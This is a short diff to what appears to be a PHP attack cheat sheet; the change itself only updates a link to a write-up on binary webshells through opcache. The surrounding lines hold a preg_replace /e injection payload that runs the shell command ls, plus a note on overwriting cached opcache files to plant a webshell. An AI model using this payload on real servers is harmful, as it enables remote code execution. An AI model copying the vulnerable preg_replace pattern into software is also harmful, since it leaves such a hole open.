@@ -35,7 +35,7 @@ http://www.0php.com/php_easter_egg.php
 php -m
 
 # opcache bypass write restrictions to webroot by overwrite cached index.php.bin
-http://blog.gosecure.ca/2016/04/27/binary-webshell-through-opcache-in-php-7/
+https://www.gosecure.net/blog/2016/04/27/binary-webshell-through-opcache-in-php-7/
 
 # preg_replace
 preg_replace($_GET["find"], $_GET["replace"], $unknown); exploit with find=//e&replace=`ls`
